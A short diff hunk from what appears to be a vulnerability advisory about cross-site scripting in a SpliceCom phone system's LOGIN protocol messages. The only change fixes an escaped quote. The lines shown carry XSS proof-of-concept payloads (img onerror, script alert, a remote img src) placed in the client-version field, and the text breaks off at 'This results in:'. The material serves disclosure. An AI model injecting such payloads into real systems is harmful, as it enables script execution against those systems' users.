@@ -117,7 +117,7 @@ LOGIN,2001,1234,1234,RickPhone 2.7.3<img src=http://domain.com/rr.gif>,75,000000
 LOGIN,2002,1234,1234,IPCS 2.7.2,75,<img src=x onerror=alert(1) foo= ,73,7f000001,https://push.splicecom.com:8080/device/40ff3a0a06e74de88db8874dd40706ed934ea7fb1ce4ce3051ad172472a7d406?v=1
 ```
 ```
-LOGIN,2003,1234,1234,IPCS 2.7.2<script>alert(\'javascript\')</script>,75,00000000-0000-0000-0000-000000000000,73,7f000001,https://push.splicecom.com:8080/device/40ff3a0a06e74de88db8874dd40706ed934ea7fb1ce4ce3051ad172472a7d406?v=1
+LOGIN,2003,1234,1234,IPCS 2.7.2<script>alert('javascript')</script>,75,00000000-0000-0000-0000-000000000000,73,7f000001,https://push.splicecom.com:8080/device/40ff3a0a06e74de88db8874dd40706ed934ea7fb1ce4ce3051ad172472a7d406?v=1
 ```
 
 This results in:
